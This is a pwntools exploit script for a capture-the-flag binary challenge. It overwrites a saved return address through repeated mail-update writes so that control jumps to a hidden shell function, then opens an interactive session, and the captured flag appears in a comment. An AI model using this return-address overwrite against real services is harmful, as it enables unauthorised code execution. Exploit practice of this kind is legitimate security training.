#!/usr/bin/env python
from pwn import *
from time import sleep

exe = ELF("./task")

context.binary = exe

sshc = None
r = None
nc = "nc 44.201.242.37 1234"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def updateMail(c):
    sendl(2)
    sendl(c)


def ret():
    sendl(3)
    r.recvuntil(b"! quitting now.")


def main():
    global r
    r = conn()
    
    # By looking at where the updateMail writes using gdb, we know that it starts writing on the
    # saved RBP (which was null here), so, we write 8 bytes for that then we'll be writing on the
    # saved RIP. We write the adr of mailshell in order to execute it when main returns
    
    payload = p64(0) + p64(exe.symbols.mailshell)
    
    for c in payload:
        updateMail(c)
    
    ret()

    r.interactive() # FLAG{do_n0t_ev3r_trUsT_u5eR_1npUt_az87eefDg}


if __name__ == "__main__":
    main()

